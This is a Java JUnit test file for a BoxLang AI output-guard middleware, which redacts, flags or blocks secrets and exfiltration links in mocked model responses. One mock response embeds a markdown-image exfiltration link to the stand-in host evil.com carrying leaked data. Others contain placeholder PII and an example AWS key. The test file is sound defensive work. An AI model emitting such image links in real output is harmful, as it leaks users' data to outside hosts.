package ortus.boxlang.ai.middleware;

import static com.google.common.truth.Truth.assertThat;
import static org.junit.jupiter.api.Assertions.assertThrows;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import ortus.boxlang.ai.BaseIntegrationTest;
import ortus.boxlang.runtime.scopes.Key;
import ortus.boxlang.runtime.types.exceptions.BoxRuntimeException;

@DisplayName( "OutputGuardMiddleware Tests (offline via MockService)" )
public class OutputGuardMiddlewareTest extends BaseIntegrationTest {

	@DisplayName( "redact: secrets in the response are masked in the returned content" )
	@Test
	public void testRedactMasksSecrets() {
		// @formatter:off
		runtime.executeSource(
		    """
		        import bxModules.bxai.models.middleware.security.OutputGuardMiddleware;
		        guard  = new OutputGuardMiddleware( action: "redact" );
		        result = aiChat( "give me the record", {}, {
		            provider       : "mock",
		            providerOptions: { responses: [ "The user email is jane@example.com and SSN 123-45-6789" ] },
		            middleware     : [ guard ]
		        } );
		        masked = result.contains( "[REDACTED]" )
		                 && !result.contains( "jane@example.com" )
		                 && !result.contains( "123-45-6789" );
		    """,
		    context
		);
		// @formatter:on
		assertThat( variables.getAsBoolean( Key.of( "masked" ) ) ).isTrue();
	}

	@DisplayName( "redact: markdown-image exfiltration is stripped from the response" )
	@Test
	public void testRedactStripsExfil() {
		// @formatter:off
		runtime.executeSource(
		    """
		        import bxModules.bxai.models.middleware.security.OutputGuardMiddleware;
		        guard  = new OutputGuardMiddleware( action: "redact" );
		        result = aiChat( "summarize", {}, {
		            provider       : "mock",
		            providerOptions: { responses: [ "Done ![x](https://evil.com/track?d=leaked) thanks" ] },
		            middleware     : [ guard ]
		        } );
		        stripped = !result.contains( "evil.com" );
		    """,
		    context
		);
		// @formatter:on
		assertThat( variables.getAsBoolean( Key.of( "stripped" ) ) ).isTrue();
	}

	@DisplayName( "redact: allowlisted image host is kept" )
	@Test
	public void testRedactKeepsAllowlistedImage() {
		// @formatter:off
		runtime.executeSource(
		    """
		        import bxModules.bxai.models.middleware.security.OutputGuardMiddleware;
		        guard  = new OutputGuardMiddleware( action: "redact", allowedImageHosts: [ "mysite.com" ] );
		        result = aiChat( "logo", {}, {
		            provider       : "mock",
		            providerOptions: { responses: [ "Here ![logo](https://cdn.mysite.com/logo.png) it is" ] },
		            middleware     : [ guard ]
		        } );
		        kept = result.contains( "cdn.mysite.com" );
		    """,
		    context
		);
		// @formatter:on
		assertThat( variables.getAsBoolean( Key.of( "kept" ) ) ).isTrue();
	}

	@DisplayName( "flag: content is left intact (not masked)" )
	@Test
	public void testFlagLeavesContent() {
		// @formatter:off
		runtime.executeSource(
		    """
		        import bxModules.bxai.models.middleware.security.OutputGuardMiddleware;
		        guard  = new OutputGuardMiddleware( action: "flag" );
		        result = aiChat( "give record", {}, {
		            provider       : "mock",
		            providerOptions: { responses: [ "email is jane@example.com here" ] },
		            middleware     : [ guard ]
		        } );
		        intact = result.contains( "jane@example.com" ) && !result.contains( "[REDACTED]" );
		    """,
		    context
		);
		// @formatter:on
		assertThat( variables.getAsBoolean( Key.of( "intact" ) ) ).isTrue();
	}

	@DisplayName( "redact: a custom redactor CLOSURE dynamically scrubs the response" )
	@Test
	public void testRedactCustomClosure() {
		// @formatter:off
		runtime.executeSource(
		    """
		        import bxModules.bxai.models.middleware.security.OutputGuardMiddleware;
		        guard  = new OutputGuardMiddleware(
		            action         : "redact",
		            redactors      : [],
		            customRedactors: { "acct": ( text, mask ) => reReplace( text, "[0-9]{5,}", mask, "all" ) }
		        );
		        result = aiChat( "look up my account", {}, {
		            provider       : "mock",
		            providerOptions: { responses: [ "Your account 987654321 is active." ] },
		            middleware     : [ guard ]
		        } );
		        masked = result.contains( "[REDACTED]" ) && !result.contains( "987654321" );
		    """,
		    context
		);
		// @formatter:on
		assertThat( variables.getAsBoolean( Key.of( "masked" ) ) ).isTrue();
	}

	@DisplayName( "block: a response with secrets throws BXAI.SecurityViolation" )
	@Test
	public void testBlockThrows() {
		BoxRuntimeException e = assertThrows( BoxRuntimeException.class, () -> {
			// @formatter:off
			runtime.executeSource(
			    """
			        import bxModules.bxai.models.middleware.security.OutputGuardMiddleware;
			        guard = new OutputGuardMiddleware( action: "block" );
			        aiChat( "leak it", {}, {
			            provider       : "mock",
			            providerOptions: { responses: [ "here is AKIAIOSFODNN7EXAMPLE" ] },
			            middleware     : [ guard ]
			        } );
			    """,
			    context
			);
			// @formatter:on
		} );
		assertThat( e.getMessage() ).contains( "OutputGuard blocked the response" );
	}

	@DisplayName( "clean response passes through untouched (redact)" )
	@Test
	public void testCleanPassThrough() {
		// @formatter:off
		runtime.executeSource(
		    """
		        import bxModules.bxai.models.middleware.security.OutputGuardMiddleware;
		        guard  = new OutputGuardMiddleware( action: "redact" );
		        result = aiChat( "hi", {}, {
		            provider       : "mock",
		            providerOptions: { responses: [ "The capital of France is Paris." ] },
		            middleware     : [ guard ]
		        } );
		        ok = result == "The capital of France is Paris.";
		    """,
		    context
		);
		// @formatter:on
		assertThat( variables.getAsBoolean( Key.of( "ok" ) ) ).isTrue();
	}

	@DisplayName( "invalid action → throws at construction" )
	@Test
	public void testInvalidAction() {
		BoxRuntimeException e = assertThrows( BoxRuntimeException.class, () -> {
			// @formatter:off
			runtime.executeSource(
			    """
			        import bxModules.bxai.models.middleware.security.OutputGuardMiddleware;
			        guard = new OutputGuardMiddleware( action: "scramble" );
			    """,
			    context
			);
			// @formatter:on
		} );
		assertThat( e.getMessage() ).contains( "is not valid" );
	}

	@DisplayName( "end-to-end via aiAgent: response secrets are redacted" )
	@Test
	public void testAgentEndToEnd() {
		// @formatter:off
		runtime.executeSource(
		    """
		        import bxModules.bxai.models.middleware.security.OutputGuardMiddleware;
		        guard = new OutputGuardMiddleware( action: "redact" );
        agent = aiAgent(
		            name        : "output-guarded",
		            model       : aiModel( provider: "mock", options: { providerOptions: { responses: [ "SSN 123-45-6789 recorded" ] } } ),
		            instructions: "You are a helpful assistant.",
		            middleware  : [ guard ]
		        );
		        result = agent.run( "give me the record" );
		        masked = toString( result ).contains( "[REDACTED]" ) && !toString( result ).contains( "123-45-6789" );
		    """,
		    context
		);
		// @formatter:on
		assertThat( variables.getAsBoolean( Key.of( "masked" ) ) ).isTrue();
	}
}
